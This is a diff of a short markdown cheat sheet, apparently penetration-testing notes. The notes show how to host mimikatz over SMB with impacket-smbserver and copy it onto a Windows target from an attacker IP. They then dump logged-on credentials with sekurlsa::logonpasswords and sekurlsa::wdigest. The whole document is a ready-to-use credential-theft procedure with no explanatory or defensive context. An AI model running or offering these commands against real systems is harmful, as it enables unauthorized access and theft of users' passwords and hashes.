@@ -4,38 +4,42 @@
 
 Locate
 ```
-locate mimikatz.exe
+$ locate mimikatz.exe
+/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
+/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
 ```
 
-Host mimikatz - x86
+Host mimikatz
 ```
-cd /usr/share/windows-resources/mimikatz/Win32/
-$ impacket-smbserver share $(pwd) -smb2support
-```
-
-Host mimikatz - x64
-```
-cd /usr/share/windows-resources/mimikatz/x64/
-$ impacket-smbserver share $(pwd) -smb2support
+cd /usr/share/windows-resources/mimikatz/
+impacket-smbserver share $(pwd) -smb2support
 ```
 
 
-Copy to Target
+Copy to Target - x64
 ```
-xcopy \\10.10.14.12\share\mimikatz.exe C:\Temp\mimikatz\
+xcopy \\10.10.14.12\share\x64\mimikatz.exe C:\Temp\mimikatz\
+```
+
+Copy to Target - x86
+```
+xcopy \\10.10.14.12\share\Win32\mimikatz.exe C:\Temp\mimikatz\
 ```
 
 
+All available creds
+```
+cd C:\Temp\mimikatz\
+C:\Temp\mimikatz\mimikatz.exe "privilege::debug" "log sekurlsa.log" "sekurlsa::logonpasswords" exit
+```
 
-PowerShell
+Only `wdigest`
 ```
-.\mimikatz "privilege::debug" "log sekurlsa.log" "sekurlsa::logonpasswords" exit
+cd C:\Temp\mimikatz\
+C:\Temp\mimikatz\mimikatz.exe "privilege::debug" "log sekurlsa.log" "sekurlsa::wdigest" exit
 ```
 
-CMD
-```
-mimikatz "privilege::debug" "log sekurlsa.log" "sekurlsa::logonpasswords" exit
-```
+
 
 
 
